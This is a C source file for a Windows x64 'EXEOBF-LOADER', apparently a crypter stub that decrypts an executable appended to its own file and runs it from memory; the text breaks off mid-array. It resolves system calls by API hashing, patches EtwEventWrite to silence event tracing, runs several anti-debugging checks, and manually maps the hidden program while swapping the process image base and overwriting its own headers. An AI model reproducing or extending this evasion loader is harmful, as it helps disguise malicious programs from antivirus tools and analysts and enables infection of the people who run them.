//=================================\\
// [ OWNER ]
//     CREATOR  : Vladislav Khudash
//     AGE      : 17
//     LOCATION : Ukraine
//
// [ PINFO ]
//     DATE     : 18.05.2026
//     PROJECT  : EXEOBF-LOADER
//     PLATFORM : WIN64
//=================================\\




#include <intrin.h>
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>




#define USING_ERASE_EXE_SIGNATURE         FALSE
#define USING_DYNAMIC_CODE_POLICY         FALSE
#define USING_SIGNATURE_DLL_POLICY        FALSE

#define PAGE_SIZE                         4096
#define KUSER_INTERRUPT_TIME_VA           0x7FFE0008

#define NTDLL_HASH                        0x006C00640074006EULL 
#define NTDLL_MASK                        0x0020002000200020ULL 

#define KEY_HASH_STR                      1993
#define HASH_EtwEventWrite                0xCD9F8954
#define HASH_NtAllocateVirtualMemory      0x34F08840
#define HASH_NtFreeVirtualMemory          0x80EF4D11
#define HASH_NtProtectVirtualMemory       0xD4210E8C
#define HASH_LdrLoadDll                   0x2140CC9D
#define HASH_LdrGetProcedureAddress       0xD39545C6
#define HASH_RtlAddFunctionTable          0x2BB97A56
#define HASH_NtQueryInformationProcess    0x4AAEEB8C
#define HASH_NtSetInformationProcess      0x4DF07E46
#define HASH_NtSetInformationThread       0x7CD06AB3
#define HASH_NtOpenFile                   0x77F8F075
#define HASH_NtReadFile                   0x8ED84F11
#define HASH_NtClose                      0x98FDEA49
#define HASH_NtQueryInformationFile       0xDE09D22F
#define HASH_NtTerminateProcess           0x596F6B0D




#if defined(_MSC_VER)
    #define DEC_FUNC static __forceinline

    #define ZEROS(dst, sz) __stosb(    \
        (PUCHAR)(dst),                 \
        (UCHAR)0,                      \
        (SIZE_T)(sz)                   \
    )

    #define MEMCPY(dst, src, sz) __movsb(    \
        (PUCHAR)(dst),                       \
        (const UCHAR*)(src),                 \
        (SIZE_T)(sz)                         \
    )
#else
    #define DEC_FUNC static inline __attribute__((always_inline)) 
    
    #define ZEROS(dst, sz) do {         \
        PVOID  _d = (PVOID)(dst);       \
        SIZE_T _n = (SIZE_T)(sz);       \
        UINT64 _c = _n >> 3,            \
               _r = _n &  7;            \
                                        \
        __asm__ volatile (              \
            "cld\n\t"                   \
                                        \
            "rep stosq\n\t"             \
            "mov %2, %%rcx\n\t"         \
            "rep stosb\n\t"             \
                                        \
            :   "+D"(_d), "+c"(_c)      \
            :   "r"(_r),  "a"(0ULL)     \
            : "memory", "cc"            \
        );                              \
    } while (0)

    #define MEMCPY(dst, src, sz) do {           \
        PVOID   _d = (PVOID)(dst);              \
        LPCVOID _s = (LPCVOID)(src);            \
        SIZE_T  _l = (SIZE_T)(sz);              \
                                                \
        __asm__ volatile (                      \
            "cld\n\t"                           \
            "rep movsb"                         \
            :   "+D"(_d), "+S"(_s), "+c"(_l)    \
            : : "memory"                        \
        );                                      \
    } while (0)
#endif




typedef struct _MN_LDR_TABLE_ENTRY_t {
    LIST_ENTRY      InLoadOrderLinks;
    LIST_ENTRY      InMemoryOrderLinks;
    LIST_ENTRY      InInitializationOrderLinks;
    PVOID           DllBase;
    PVOID           EntryPoint;
    ULONG           SizeOfImage;
    UNICODE_STRING  FullDllName;
    UNICODE_STRING  BaseDllName;
} MN_LDR_TABLE_ENTRY, *PMN_LDR_TABLE_ENTRY;


typedef struct _MN_PEB_t {
    BYTE           Reserved1[2];
    BOOLEAN        BeingDebugged;
    BYTE           Reserved2[13];
    PVOID          ImageBaseAddress;
    PPEB_LDR_DATA  Ldr;
} MN_PEB, *PMN_PEB;




typedef struct {
    DWORD   hs;
    PVOID  *fn;
} FUNC_ENTRY;


typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE     ProcessHandle,
    PVOID     *BaseAddress,
    ULONG_PTR  ZeroBits,
    PSIZE_T    RegionSize,
    ULONG      AllocationType,
    ULONG      Protect
);


typedef NTSTATUS (NTAPI *NtFreeVirtualMemory_t)(
    HANDLE   ProcessHandle,
    PVOID   *BaseAddress,
    PSIZE_T  RegionSize,
    ULONG    FreeType
);


typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE   ProcessHandle,
    PVOID   *BaseAddress,
    PSIZE_T  RegionSize,
    ULONG    NewProtect,
    PULONG   OldProtect
);


typedef NTSTATUS (NTAPI *LdrLoadDll_t)(
    PWSTR            PathToFile,
    PULONG           Flags,
    PUNICODE_STRING  ModuleFileName,
    PHANDLE          ModuleHandle
);


typedef NTSTATUS (NTAPI *LdrGetProcedureAddress_t)(
    PVOID         ModuleHandle,
    PANSI_STRING  FunctionName,
    ULONG         Ordinal,
    PVOID        *FunctionAddress
);


typedef BOOLEAN (NTAPI *RtlAddFunctionTable_t)(
    PRUNTIME_FUNCTION  FunctionTable,
    DWORD              EntryCount,
    DWORD64            BaseAddress
);


typedef NTSTATUS (NTAPI *NtQueryInformationProcess_t)(
    HANDLE  ProcessHandle,
    ULONG   ProcessInformationClass,
    PVOID   ProcessInformation,
    ULONG   ProcessInformationLength,
    PULONG  ReturnLength
);


typedef NTSTATUS (NTAPI *NtSetInformationProcess_t)(
    HANDLE  ProcessHandle,
    ULONG   ProcessInformationClass,
    PVOID   ProcessInformation,
    ULONG   ProcessInformationLength
);


typedef NTSTATUS (NTAPI *NtSetInformationThread_t)(
    HANDLE  ThreadHandle,
    ULONG   ThreadInformationClass,
    PVOID   ThreadInformation,
    ULONG   ThreadInformationLength
);


typedef NTSTATUS (NTAPI *NtOpenFile_t)(
    PHANDLE             FileHandle,
    ACCESS_MASK         DesiredAccess,
    POBJECT_ATTRIBUTES  ObjectAttributes,
    PIO_STATUS_BLOCK    IoStatusBlock,
    ULONG               ShareAccess,
    ULONG               OpenOptions
);


typedef NTSTATUS (NTAPI *NtReadFile_t)(
    HANDLE            FileHandle,
    HANDLE            Event,
    PVOID             ApcRoutine,
    PVOID             ApcContext,
    PIO_STATUS_BLOCK  IoStatusBlock,
    PVOID             Buffer,
    ULONG             Length,
    PLARGE_INTEGER    ByteOffset,
    PULONG            Key
);


typedef NTSTATUS (NTAPI *NtClose_t)(
    HANDLE  Handle
);


typedef NTSTATUS (NTAPI *NtQueryInformationFile_t)(
    HANDLE                  FileHandle,
    PIO_STATUS_BLOCK        IoStatusBlock,
    PVOID                   FileInformation,
    ULONG                   Length,
    FILE_INFORMATION_CLASS  FileInformationClass
);


typedef NTSTATUS (NTAPI *NtTerminateProcess_t)(
    HANDLE    ProcessHandle,
    NTSTATUS  ExitStatus
);


typedef INT (WINAPI *EntryPoint_t)(VOID);




#define CUR_THR           (          (HANDLE)-2          )
#define CUR_PROC          (          (HANDLE)-1          )
#define Exit(s)         pNtTerminateProcess(CUR_PROC, (s))
#define GET_PEB()         ( (PMN_PEB)__readgsqword(0x60) )
#define ALIGN_PAGE(sz)    (   ((sz) + 0xFFF) & ~0xFFF    )


static  PVOID                        pNtEtwEventWrite            = NULL;
static  NtAllocateVirtualMemory_t    pNtAllocateVirtualMemory    = NULL;
static  NtFreeVirtualMemory_t        pNtFreeVirtualMemory        = NULL;
static  NtProtectVirtualMemory_t     pNtProtectVirtualMemory     = NULL;
static  LdrLoadDll_t                 pLdrLoadDll                 = NULL;
static  LdrGetProcedureAddress_t     pLdrGetProcedureAddress     = NULL;
static  RtlAddFunctionTable_t        pRtlAddFunctionTable        = NULL;
static  NtQueryInformationProcess_t  pNtQueryInformationProcess  = NULL;
static  NtSetInformationProcess_t    pNtSetInformationProcess    = NULL;
static  NtSetInformationThread_t     pNtSetInformationThread     = NULL;
static  NtOpenFile_t                 pNtOpenFile                 = NULL;
static  NtReadFile_t                 pNtReadFile                 = NULL;
static  NtClose_t                    pNtClose                    = NULL;
static  NtQueryInformationFile_t     pNtQueryInformationFile     = NULL;
static  NtTerminateProcess_t         pNtTerminateProcess         = NULL;




#define INIT_ASTR(dst, src) do {              \
    PANSI_STRING _d = (PANSI_STRING)(dst);    \
    PCSTR        _s = (PCSTR)(src);           \
                                              \
    _d->Buffer = (PSTR)_s;                    \
    USHORT _l  = 0;                           \
    while (_s[_l++]);                         \
                                              \
    _d->Length        = _l - sizeof(CHAR);    \
    _d->MaximumLength = _l;                   \
} while (0)


#define INIT_USTR(dst, src) do {                    \
    PUNICODE_STRING _d = (PUNICODE_STRING)(dst);    \
    PCWSTR          _s = (PCWSTR)(src);             \
                                                    \
    _d->Buffer = (PWSTR)_s;                         \
    USHORT _l  = 0;                                 \
    while (_s[_l++]);                               \
    _l *= sizeof(WCHAR);                            \
                                                    \
    _d->Length        = _l - sizeof(WCHAR);         \
    _d->MaximumLength = _l;                         \
} while (0)


DEC_FUNC DWORD HashStr(LPCSTR s) {
    DWORD h = KEY_HASH_STR;  
    BYTE  c;
    
    while (c = (BYTE)*s++) {
        if ((c >= 'A') && (c <= 'Z')) c |= 0x20;  
        h = ( (h << 4) - h ) + c;
    }

    return h;
}




DEC_FUNC HMODULE GetLibAddr(const MN_PEB *peb) {
    const LIST_ENTRY *mdl = &peb->Ldr->InMemoryOrderModuleList;
    
    for (PLIST_ENTRY 
        e =  mdl->Flink; 
        e != mdl; 
        e =  e->Flink
    ) {PMN_LDR_TABLE_ENTRY 
        rc = CONTAINING_RECORD(e, MN_LDR_TABLE_ENTRY, InMemoryOrderLinks);
        if (
            rc->BaseDllName.Buffer && (
            (*(PUINT64)rc->BaseDllName.Buffer | NTDLL_MASK
            ) == NTDLL_HASH) 
        ) return (HMODULE)rc->DllBase;
    }


    return NULL;
}




DEC_FUNC BOOL GetFuncs(
    HMODULE                     hmd,
    const IMAGE_DATA_DIRECTORY *exdr,
    FUNC_ENTRY                 *ent,
    BYTE                        esz
) {
    const IMAGE_EXPORT_DIRECTORY 
        *extb = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hmd + exdr->VirtualAddress);
    

    PDWORD addr = (PDWORD)((PBYTE)hmd + extb->AddressOfNames       ),
           func = (PDWORD)((PBYTE)hmd + extb->AddressOfFunctions   );
    PWORD  ordd = (PWORD )((PBYTE)hmd + extb->AddressOfNameOrdinals);
    BYTE   lft  = esz;


    PDWORD ade = addr + extb->NumberOfNames;
    
    for (;  lft && (addr < ade);  addr++, ordd++) {
        DWORD hs = HashStr( (LPCSTR)((PBYTE)hmd + *addr) );

        for (BYTE j = 0;  j < esz;  j++) {
            if ((ent[j].hs != hs) || (*ent[j].fn != NULL)) 
                continue;
            

            DWORD frv = func[*ordd];
            if ((frv >= exdr->VirtualAddress) &&
                (frv < (exdr->VirtualAddress + exdr->Size))
            ) return FALSE;   


            *ent[j].fn = (PVOID)((PBYTE)hmd + frv);
            lft--; break;
        }
    }


    return lft == 0;
}




DEC_FUNC BOOL InitPEBApi(HMODULE *phNt, const MN_PEB *peb) {
    *phNt      = GetLibAddr(peb);
    HMODULE hd = *phNt;
    if (!hd) return FALSE;


    const IMAGE_NT_HEADERS     
        *nthd = (PIMAGE_NT_HEADERS)((PBYTE)hd + 
                ((PIMAGE_DOS_HEADER)hd)->e_lfanew);
    
    const IMAGE_DATA_DIRECTORY 
        *exdr = &nthd->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exdr->Size) return FALSE;


    FUNC_ENTRY fey[] = {
        { HASH_EtwEventWrite,             (PVOID*)&pNtEtwEventWrite           },
        { HASH_NtAllocateVirtualMemory,   (PVOID*)&pNtAllocateVirtualMemory   },
        { HASH_NtFreeVirtualMemory,       (PVOID*)&pNtFreeVirtualMemory       },
        { HASH_NtProtectVirtualMemory,    (PVOID*)&pNtProtectVirtualMemory    },
        { HASH_LdrLoadDll,                (PVOID*)&pLdrLoadDll                },
        { HASH_LdrGetProcedureAddress,    (PVOID*)&pLdrGetProcedureAddress    },
        { HASH_RtlAddFunctionTable,       (PVOID*)&pRtlAddFunctionTable       },
        { HASH_NtQueryInformationProcess, (PVOID*)&pNtQueryInformationProcess },
        { HASH_NtSetInformationProcess,   (PVOID*)&pNtSetInformationProcess   },
        { HASH_NtSetInformationThread,    (PVOID*)&pNtSetInformationThread    },
        { HASH_NtOpenFile,                (PVOID*)&pNtOpenFile                },
        { HASH_NtReadFile,                (PVOID*)&pNtReadFile                },
        { HASH_NtClose,                   (PVOID*)&pNtClose                   },
        { HASH_NtQueryInformationFile,    (PVOID*)&pNtQueryInformationFile    },
        { HASH_NtTerminateProcess,        (PVOID*)&pNtTerminateProcess        }
    }; return GetFuncs(hd, exdr, fey, (BYTE)(sizeof(fey) / sizeof(*fey)));
}




DEC_FUNC HMODULE hLoadLib(LPCWSTR nm) {
    UNICODE_STRING s;
    INIT_USTR(&s, nm);
    HANDLE hd = NULL;
    
    return pLdrLoadDll(NULL, NULL, &s, &hd)? 
                NULL : (HMODULE)hd;
}


DEC_FUNC FARPROC GetProcAddr(HMODULE hmd, LPCSTR fnm) {
    ANSI_STRING s;
    INIT_ASTR(&s, fnm);
    PVOID p = NULL;
    
    return pLdrGetProcedureAddress(hmd, &s, 0, &p)? 
                    NULL : (FARPROC)p;
}




DEC_FUNC VOID ProtectImage(PVOID img, const IMAGE_NT_HEADERS *nthd) {
    PVOID  hadr = img;
    SIZE_T hsz  = nthd->OptionalHeader.SizeOfHeaders;
    ULONG  holp;

    pNtProtectVirtualMemory(CUR_PROC, &hadr, &hsz, PAGE_READONLY, &holp);


    const ULONG ProtTab[] = {
        PAGE_NOACCESS,
        PAGE_EXECUTE,
        PAGE_READONLY,
        PAGE_EXECUTE_READ,
        PAGE_READWRITE,
        PAGE_EXECUTE_READWRITE,
        PAGE_READWRITE,
        PAGE_EXECUTE_READWRITE
    };


    PIMAGE_SECTION_HEADER sh = IMAGE_FIRST_SECTION(nthd),
                          se = sh + nthd->FileHeader.NumberOfSections;
    
    for (;  sh < se;  sh++) {
        BYTE   idx = (BYTE)((sh->Characteristics >> 29) & 0x07);
        PVOID  adr = (PVOID)((PBYTE)img + sh->VirtualAddress);
        SIZE_T vsz = sh->Misc.VirtualSize;
        ULONG  olp;

        pNtProtectVirtualMemory(CUR_PROC, &adr, &vsz, ProtTab[idx], &olp);
    }
}




DEC_FUNC VOID ExecTLS(PVOID img, const IMAGE_NT_HEADERS *nthd) {
    const IMAGE_DATA_DIRECTORY 
        *tdr = &nthd->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (!tdr->Size || !tdr->VirtualAddress) return;


    PIMAGE_TLS_DIRECTORY64 
         tls = (PIMAGE_TLS_DIRECTORY64)((PBYTE)img + tdr->VirtualAddress);
    if (!tls->AddressOfCallBacks) return;

    PIMAGE_TLS_CALLBACK   
        *fcb = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
    if (!fcb) return;
     

    while (*fcb) (*fcb++)(img, DLL_PROCESS_ATTACH, NULL);
}




DEC_FUNC BYTE DecByte(
    BYTE    b,
    PUINT   idx,
    PBYTE   stat,
    LPCBYTE key,
    BYTE    mask
) {
    UINT j  = (*idx)++;
    BYTE k1 = *(key + ( j       & mask));
    BYTE k2 = *(key + ((j >> 3) & mask));

    BYTE t  = ( j  &  0xFF) ^ ((j >> 8)  & 0xFF);
    BYTE y  = ((k1 << 1   ) | (k2 >> 7)) ^ t;
    BYTE m  = (y ^ (y >> 4));

    BYTE r  = (b  ^  m ) - (*stat ^  k1);
    r       = ((r >> 3 ) | (r     << 5));
    *stat   = (r  +  k2) ^ (*stat >> 1 );

    return r;
}


DEC_FUNC VOID UnPack(
    PBYTE dst,   LPCBYTE src, 
    DWORD srcSz, DWORD   dstMax,
        LPCBYTE key,
        BYTE    mask
) {
    UINT idx  = 0;
    BYTE stat = *key;  


    LPCBYTE srcEnd = src + srcSz;
    PBYTE   dstEnd = dst + dstMax;

    while (src < srcEnd) {
        BYTE c = DecByte(*src++, &idx, &stat, key, mask);
        
        if (c & 0x80) {
            BYTE l = c & 0x7F;
            if (src >= srcEnd) return;

            BYTE v = DecByte(*src++, &idx, &stat, key, mask);
            while (l-- && (dst < dstEnd)) *dst++ = v;
        } 
        else {
            BYTE l = c;
            if ((src + l) > srcEnd) return;

            while (l-- && (dst < dstEnd)) 
                *dst++ = DecByte(*src++, &idx, &stat, key, mask);
        }
    }
}




DEC_FUNC VOID FreeBuf(PVOID buf, const SIZE_T sz) {
    SIZE_T zr = 0;
    ZEROS(buf, sz);
    pNtFreeVirtualMemory(CUR_PROC, &buf, &zr, MEM_RELEASE);
}




DEC_FUNC PBYTE ReadOverlay(VOID) {
    UINT32 tlLn  = 4;
    PUNICODE_STRING fPath;
    HANDLE hFile = NULL;



    BYTE  pBf[ (MAX_PATH * sizeof(WCHAR)) + sizeof(UNICODE_STRING) ];
    ULONG pBl;

    if (pNtQueryInformationProcess(
        CUR_PROC, ProcessImageFileName, 
        pBf, sizeof(pBf), &pBl
    )) return NULL;

    fPath = (PUNICODE_STRING)pBf;



    IO_STATUS_BLOCK   io;
    OBJECT_ATTRIBUTES attr;

    attr.Length                   = sizeof(OBJECT_ATTRIBUTES);
    attr.RootDirectory            = NULL;
    attr.ObjectName               = fPath;
    attr.Attributes               = OBJ_CASE_INSENSITIVE; 
    attr.SecurityDescriptor       = NULL;
    attr.SecurityQualityOfService = NULL;



    if (pNtOpenFile(
        &hFile, 
        FILE_READ_DATA|SYNCHRONIZE, 
        &attr, &io, 
        FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
        FILE_SYNCHRONOUS_IO_NONALERT|FILE_NON_DIRECTORY_FILE
    )) return NULL;


    FILE_STANDARD_INFORMATION fsi;
    if (pNtQueryInformationFile(
        hFile, 
        &io, &fsi, 
        sizeof(fsi), 
        FileStandardInformation
    )) {pNtClose(hFile); return NULL;}



    LONGLONG fSz = fsi.EndOfFile.QuadPart;
    if (fSz < tlLn) {pNtClose(hFile); return NULL;}


    LARGE_INTEGER offS = { .QuadPart = fSz - tlLn };
    if (pNtReadFile(
        hFile, 
        NULL, NULL, NULL,
        &io, &tlLn, 
        tlLn, &offS, 
        NULL
    )) {pNtClose(hFile); return NULL;}
    

    tlLn += sizeof(tlLn); 
    if (tlLn > fSz) {pNtClose(hFile); return NULL;}



    PVOID  buf = NULL;
    SIZE_T bsz = tlLn;

    if (pNtAllocateVirtualMemory(
        CUR_PROC, 
        &buf, 0, &bsz,
        MEM_COMMIT|MEM_RESERVE|MEM_TOP_DOWN,
        PAGE_READWRITE
    )) {pNtClose(hFile); return NULL;}
    
    *(PUINT32)buf = tlLn;



    offS.QuadPart = fSz - tlLn;
    if (pNtReadFile(
        hFile, 
        NULL, NULL, NULL, 
        &io, (PBYTE)buf + sizeof(tlLn), 
        tlLn - sizeof(tlLn), &offS, 
        NULL
    )) {
        SIZE_T zr = 0;
        pNtFreeVirtualMemory(CUR_PROC, &buf, &zr, MEM_RELEASE);
        pNtClose(hFile); return NULL;
    }



    pNtClose(hFile); 
    return (PBYTE)buf;
}




INT Main(VOID) {ULONG_PTR AddrEntry;
{//*
    PMN_PEB peb = GET_PEB();
    if (peb->BeingDebugged) return STATUS_ACCESS_VIOLATION;



    HMODULE hNt = NULL;
    if (!InitPEBApi(&hNt, peb)) return STATUS_DLL_NOT_FOUND;



    {ULONG_PTR fDfg = 1,  fDgp = 0;


    {PVOID fadr = pNtEtwEventWrite;
    SIZE_T fsz  = 3;
    ULONG  fold;

    if (!pNtProtectVirtualMemory(CUR_PROC, &fadr, &fsz, PAGE_READWRITE, &fold)) {
        ((volatile BYTE*)fadr)[0] = 0x31; // xor
        ((volatile BYTE*)fadr)[1] = 0xC0; // eax, eax
        ((volatile BYTE*)fadr)[2] = 0xC3; // ret 
        pNtProtectVirtualMemory( CUR_PROC, &fadr, &fsz, fold,           &fold);
    }}
    
    
    PROCESS_BASIC_INFORMATION pbi;
    pNtQueryInformationProcess(
        CUR_PROC, ProcessBasicInformation, 
        &pbi, sizeof(pbi), NULL
    ); if ((PMN_PEB)pbi.PebBaseAddress != peb) Exit(STATUS_REVISION_MISMATCH);  


    pNtQueryInformationProcess(
        CUR_PROC, ProcessDebugPort, 
        &fDgp, sizeof(fDgp), NULL
    ); if (fDgp) Exit(STATUS_ACCESS_VIOLATION);


    pNtSetInformationProcess(
        CUR_PROC, ProcessDebugFlags,      
        &fDfg, sizeof(fDfg)
    );
    pNtSetInformationThread( 
        CUR_THR, ThreadHideFromDebugger, 
        NULL, 0
    );
    
    
    if (USING_SIGNATURE_DLL_POLICY) {
        PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = { 0 };
        sp.MicrosoftSignedOnly                        =   1  ;
        pNtSetInformationProcess(
            CUR_PROC, ProcessSignaturePolicy, 
            &sp, sizeof(sp)
        );
    }}



// [UINT32=total_len:4|BYTE=key_size:1|LPCBYTE=key:key_size|UINT32=raw_len:4|LPCBYTE=encrypted_exe]
    PBYTE PE_DAT = ReadOverlay();
    if (!PE_DAT) Exit(STATUS_DATA_ERROR);
    


    const UINT32 PE_DAT_SZ = *(const UINT32*)PE_DAT;
    const BYTE   PE_KEY_SZ = *(PE_DAT + 4);

    
    const UINT32 RW_EXE_SZ = *(const UINT32*)(PE_DAT + 4 + 1 + PE_KEY_SZ),
                 DT_EXE_SZ = PE_DAT_SZ - (4 + 1 + PE_KEY_SZ + 4),

                 PE_EXE_SZ = (RW_EXE_SZ > DT_EXE_SZ)?
                              RW_EXE_SZ : DT_EXE_SZ;


    const LPCBYTE
        PE_KEY = (LPCBYTE)(PE_DAT + 4 + 1),
        PE_EXE = (LPCBYTE)(PE_DAT + 4 + 1 + PE_KEY_SZ + 4);



    PVOID   buf = NULL;
    {SIZE_T bsz = (SIZE_T)PE_EXE_SZ;

    if (pNtAllocateVirtualMemory(
        CUR_PROC, 
        &buf, 0, &bsz,
        MEM_COMMIT|MEM_RESERVE|MEM_TOP_DOWN, 
        PAGE_READWRITE
    )) Exit(STATUS_MEMORY_NOT_ALLOCATED);


    UnPack(
        (PBYTE)buf, PE_EXE, 
        DT_EXE_SZ,  PE_EXE_SZ,
        PE_KEY,     PE_KEY_SZ - 1
    ); FreeBuf(PE_DAT, PE_DAT_SZ);}
    


    const IMAGE_NT_HEADERS 
        *nthd = (PIMAGE_NT_HEADERS)((PBYTE)buf + 
                ((PIMAGE_DOS_HEADER)buf)->e_lfanew);



    PVOID   img = NULL;
    {SIZE_T isz = ALIGN_PAGE(nthd->OptionalHeader.SizeOfImage + PAGE_SIZE);

    if (pNtAllocateVirtualMemory(
        CUR_PROC, 
        &img, 0, &isz, 
        MEM_COMMIT|MEM_RESERVE|MEM_TOP_DOWN, 
        PAGE_READWRITE 
    )) { 
        FreeBuf(buf, PE_EXE_SZ); 
        Exit(STATUS_MEMORY_NOT_ALLOCATED); 
    }}


    {PVOID gadr = img;
    SIZE_T gsz  = PAGE_SIZE;
    ULONG  golp;
    
    pNtProtectVirtualMemory(
        CUR_PROC, 
        &gadr, &gsz, 
        PAGE_NOACCESS|PAGE_GUARD, 
        &golp
    );}

    
    img = (PVOID)((PBYTE)img + PAGE_SIZE);
    MEMCPY(img, buf, nthd->OptionalHeader.SizeOfHeaders); 



    {PIMAGE_SECTION_HEADER
        sn = IMAGE_FIRST_SECTION(nthd),
        se = sn + nthd->FileHeader.NumberOfSections;

    for (;  sn < se;  sn++) {
        if (!sn->Misc.VirtualSize) continue;


        LPVOID dst = (LPVOID)((PBYTE)img + sn->VirtualAddress  ),
               src = (LPVOID)((PBYTE)buf + sn->PointerToRawData);

        DWORD  sz  = (sn->SizeOfRawData  < sn->Misc.VirtualSize)? 
                      sn->SizeOfRawData  : sn->Misc.VirtualSize ;
            
        if (sz) MEMCPY(dst, src, sz);


        if (sn->SizeOfRawData < sn->Misc.VirtualSize)
            ZEROS((PBYTE)dst           + sn->SizeOfRawData, 
                  sn->Misc.VirtualSize - sn->SizeOfRawData);
    }}

    
    
    {UINT64 dlt = (UINT64)img - nthd->OptionalHeader.ImageBase;
     const IMAGE_DATA_DIRECTORY 
        *ldr = &nthd->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    
    if (dlt && ldr->Size && ldr->VirtualAddress) {
        PIMAGE_BASE_RELOCATION 
            rl   = (PIMAGE_BASE_RELOCATION)((PBYTE)img + ldr->VirtualAddress),
            rlEn = (PIMAGE_BASE_RELOCATION)((PBYTE)rl  + ldr->Size          );
            
        while (
            (rl < rlEn) &&
            rl->VirtualAddress &&
            (rl->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
        ) {
            PWORD it = (PWORD)(rl + 1),
                  en = it + ((rl->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD)); 


            PBYTE pb = (PBYTE)img + rl->VirtualAddress;

            for (;  it < en;  it++) 
                if ((*it >> 12) == IMAGE_REL_BASED_DIR64) 
                    *(PULONG_PTR)(pb + (*it & 0xFFF)) += dlt;
            

            rl = (PIMAGE_BASE_RELOCATION)((PBYTE)rl + rl->SizeOfBlock);
        }
    }}



    {const IMAGE_DATA_DIRECTORY 
        *imdr = &nthd->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    
    if (imdr->Size && imdr->VirtualAddress) {
        WCHAR dp[MAX_PATH + 1];
        PIMAGE_IMPORT_DESCRIPTOR 
            ids = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)img + imdr->VirtualAddress);

        while (ids->Name) {
            PCHAR _s = (PCHAR)((PBYTE)img + ids->Name);


            PWCHAR _p = dp;
            while ( *_s && ((_p - dp) < MAX_PATH) ) 
                *_p++ = (WCHAR)*_s++;
            *_p       = L'\0';


            HMODULE hLib = hLoadLib(dp);
            if (!hLib) { 
                FreeBuf(buf, PE_EXE_SZ); 
                Exit(STATUS_INVALID_IMAGE_FORMAT);
            }
            

            PIMAGE_THUNK_DATA 
                tnk = (PIMAGE_THUNK_DATA)((PBYTE)img + ids->FirstThunk     ),                  
                otk = (PIMAGE_THUNK_DATA)((PBYTE)img + ids->Characteristics);
            if (!ids->Characteristics) otk = tnk;
            
            while (tnk->u1.AddressOfData && otk->u1.AddressOfData) {
                if (otk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                    ULONG fod = (ULONG)(otk->u1.Ordinal & 0xFFFF);
                    PVOID fdr = NULL;
                    
                    if (pLdrGetProcedureAddress(hLib, NULL, fod, &fdr)) {
                        FreeBuf(buf, PE_EXE_SZ);
                        Exit(STATUS_ORDINAL_NOT_FOUND);
                    }

                    tnk->u1.Function = (UINT64)fdr;
                } 
                else {PIMAGE_IMPORT_BY_NAME 
                            fnm = (PIMAGE_IMPORT_BY_NAME)((PBYTE)img + otk->u1.AddressOfData);
                    FARPROC fdr = GetProcAddr(hLib, (LPCSTR)fnm->Name);
                    
                    if (!fdr) {
                        FreeBuf(buf, PE_EXE_SZ);
                        Exit(STATUS_ENTRYPOINT_NOT_FOUND);
                    }
                    
                    tnk->u1.Function = (UINT64)fdr;
                }


                tnk++; otk++;
            }


            ids++;
        }
    }}



    {const IMAGE_DATA_DIRECTORY 
        *edr = &nthd->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    
    if (edr->Size && edr->VirtualAddress) pRtlAddFunctionTable(
        (PRUNTIME_FUNCTION)((PBYTE)img + edr->VirtualAddress),
        (DWORD)(edr->Size / sizeof(RUNTIME_FUNCTION)),
        (DWORD64)img
    );}



    {const IMAGE_DATA_DIRECTORY 
        *lcd = &nthd->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
        
    if (lcd->Size && lcd->VirtualAddress) {
        PIMAGE_LOAD_CONFIG_DIRECTORY64 
            lc = (PIMAGE_LOAD_CONFIG_DIRECTORY64)((PBYTE)img + lcd->VirtualAddress);
        
        if (lc->SecurityCookie) {
            ULONG_PTR *cadr = (ULONG_PTR*)lc->SecurityCookie;
            *cadr = (ULONG_PTR)img ^ *(volatile ULONG_PTR*)KUSER_INTERRUPT_TIME_VA;
        }
    }}



    PVOID iba = peb->ImageBaseAddress;
    peb->ImageBaseAddress = img;



    if (USING_ERASE_EXE_SIGNATURE) {
        PIMAGE_DOS_HEADER idh = (PIMAGE_DOS_HEADER)img;
        ((PIMAGE_NT_HEADERS)((PBYTE)img + idh->e_lfanew)
        )->Signature = 0;
        idh->e_magic = 0;
    }

    ProtectImage(img, nthd);

    if (USING_DYNAMIC_CODE_POLICY) {
        ULONG_PTR fPol = 1; 
        pNtSetInformationProcess(
            CUR_PROC, ProcessDynamicCodePolicy, 
            &fPol, sizeof(fPol)
        );
    }



    AddrEntry = (ULONG_PTR)img + nthd->OptionalHeader.AddressOfEntryPoint;
    ExecTLS(img, nthd);


    
    {PVOID iadr = iba;
    DWORD  idos = ((PIMAGE_DOS_HEADER)iba)->e_lfanew;
    SIZE_T asz  = PAGE_SIZE;
    ULONG  op;

    if ((idos < asz) && !pNtProtectVirtualMemory(
        CUR_PROC, &iadr, &asz, PAGE_READWRITE, &op)
    ) {
        DWORD ioz = ((PIMAGE_NT_HEADERS)((PBYTE)iba + idos))->OptionalHeader.SizeOfImage;


        PIMAGE_NT_HEADERS ntd = (PIMAGE_NT_HEADERS)((PBYTE)hNt +
                                ((PIMAGE_DOS_HEADER)hNt)->e_lfanew);
        MEMCPY(iba, hNt, (ntd->OptionalHeader.SizeOfHeaders < asz)? 
                          ntd->OptionalHeader.SizeOfHeaders : asz);
        

        ((PIMAGE_DOS_HEADER)iba)->e_lfanew = idos;


        PIMAGE_NT_HEADERS ntn = (PIMAGE_NT_HEADERS)((PBYTE)iba + idos);
        ntn->OptionalHeader.SizeOfImage = ioz;
        ntn->OptionalHeader.ImageBase   = (ULONG_PTR)iba; 


        PIMAGE_DATA_DIRECTORY dd = ntn->OptionalHeader.DataDirectory;
        BYTE idx[] = { 
